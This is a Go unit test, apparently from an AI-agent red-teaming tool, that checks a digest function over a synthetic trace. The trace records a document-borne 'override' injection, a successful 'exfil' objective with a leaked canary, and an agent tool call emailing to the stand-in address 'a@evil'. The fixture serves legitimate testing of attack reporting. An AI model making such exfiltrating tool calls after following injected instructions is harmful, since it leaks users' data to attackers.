package advisory

import (
	"strings"
	"testing"

	"github.com/41vi4p/agentbreak/core/internal/trace"
)

func TestDigestIsCompactAndIncludesEvidence(t *testing.T) {
	tr := &trace.Trace{TraceID: "t", GuardMode: "off", UserTurns: []string{"summarise"},
		Attack:   &trace.Attack{Technique: "override", Surface: "doc", Payload: strings.Repeat("x", 5000)},
		Verdicts: []trace.Verdict{{ObjectiveID: "exfil", Success: true, Evidence: "leaked CANARY"}}}
	_, _ = tr.Append(trace.StepToolCall, 1, map[string]any{"name": "send_email", "args": map[string]any{"to": "a@evil"}})
	d := Digest(tr)
	if len(d) > 1500 || !strings.Contains(d, "leaked CANARY") || !strings.Contains(d, "send_email") {
		t.Fatalf("bad digest (%d bytes): %s", len(d), d)
	}
}
